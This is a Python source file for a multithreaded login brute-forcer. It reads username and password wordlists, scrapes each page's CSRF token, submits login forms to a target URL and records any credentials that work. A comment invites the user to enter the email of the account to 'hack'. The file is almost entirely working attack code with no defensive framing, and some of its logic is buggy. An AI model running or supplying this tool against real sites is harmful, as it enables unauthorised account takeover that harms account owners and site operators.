import requests
from lxml import html
from sys import exit
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures
class WebLogin:
    def __init__(self,threads:int) -> None:
        self.threads=threads
        self.INCORRECT_MESSAGE = self.fetch_files('./temp_files/incorrectMessage.txt')
        self.SUCCESS_MESSAGE = self.fetch_files('./temp_files/successMessage.txt')
        self.PASSWORDS = self.fetch_files('./temp_files/passwords.txt')
        self.USERS = self.fetch_files('./temp_files/users.txt')
        self.LIMIT_TRYING_ACCESSING_URL = 7
    def fetch_files(self,file_path):
        return [item.replace("\n", "") for item in open(file_path).readlines()]
    def process_request(self,request, user, password, failed_aftertry):
        """
        This method will proceed the request

        Args:
            request:
            user:
            password:
            failed_aftertry:

        Returns:

        """
        if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
            if failed_aftertry > self.LIMIT_TRYING_ACCESSING_URL:
                print("[+] Connection failed : Trying again ....")
                return
            else:
                failed_aftertry = failed_aftertry + 1
                print("[+] Connection failed : 404 Not Found (Verify your url)")
        else:
            # if you want to see the text result remove the comment here
            # print data.text
            if self.INCORRECT_MESSAGE[0] in request.text or self.INCORRECT_MESSAGE[1] in request.text:
                print("[+] Failed to connect with:\n user: " + user + " and password: " + password)
            else:
                if self.SUCCESS_MESSAGE[0] in request.text or self.SUCCESS_MESSAGE[1] in request.text:
                    result = "\n[+] --------------------------------------------------------------"
                    result += "\n[+] YOooCHA!! \nTheese Credentials succeed to LogIn:\n> username: " + user + " and " \
                                                                                                            "password: " \
                                                                                                            "" + password
                    result += "\n[+] --------------------------------------------------------------\n"
                    with open("./temp_files/results.txt", "w+") as frr:
                        frr.write(result)
                    print(
                        "[+] A Match succeed 'user: " + user + " and password: " + password + "' and have been saved at "
                                                                                            "./results.txt")
                    exit()
                else:
                    print("Trying theese parameters: user: " + user + " and password: " + password)


    def get_csrf_token(self,url, csrf_field):
        """
        This method will fetch the token in the web-page and return it
        """
        # Get login _token
        print("[+] Connecting to ", url)
        result = requests.get(url)
        tree = html.fromstring(result.text)

        print("[+] Trying to Fetch a token..")
        _token = ""
        try:
            _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
        except Exception as es: pass

        return _token


    def process_user(self,user, url, failed_aftertry, user_field, password_field, csrf_field="_csrf"):
        """[summary]

        Arguments:
            user {[type]} -- [description]
            url {[type]} -- [description]
            failed_aftertry {[type]} -- [description]
            user_field {[type]} -- [description]
            password_field {[type]} -- [description]
        """
        for password in self.PASSWORDS:
            # Create the payload for the submission form
            payload = {
                user_field: user.replace('\n', ''),
                password_field: password.replace('\n', ''),
                csrf_field: self.get_csrf_token(url, csrf_field)
            }
            print("[+]", payload)
            # Doing the post form
            request = requests.post(url, data=payload)

            self.process_request(request, user, password, failed_aftertry)


    def try_connection(self,url, user_field, password_field, csrf_field):
        """[summary]

        Arguments:
            url {[type]} -- [description]
            user_field {[type]} -- [description]
            password_field {[type]} -- [description]
        """
        print("[+] Connecting to: " + url + "......\n")
        # Put the target email you want to hack
        # user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
        failed_aftertry = 0
        with ThreadPoolExecutor(self.threads) as executor:
            futures = []
            for user in self.USERS:
                future = executor.submit(
                    self.process_user,
                    user,
                    url,
                    failed_aftertry,
                    user_field,
                    password_field,
                    csrf_field
                )
                futures.append(future)

            # Wait for all futures to complete
            futures.wait(futures)


    def manual_mode(self):
        """[summary]
        """
        print("[+] Manual mode selected ")
        print("[+] After inspecting the LOGIN <form />, please fill here :")

        # Field's Form -------
        # The link of the website
        url = input("\n[+] Enter the target URL (it's the 'action' attribute on the form tag):")
        # The user_field in the form of the login
        user_field = input(
            "\n[+] Enter the User Field  (it's the 'name' attribute on the Login form for the username/email):")
        # The password_field in the form
        password_field = input(
            "\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")

        # The password_field in the form
        csrf_field = input(
            "\n[+] Enter the csrf-token field  (it's the 'name' attribute on the Login form for the csrf, leave blank if "
            "this attribute is not present in the form):")

        self.try_connection(url, user_field, password_field, csrf_field)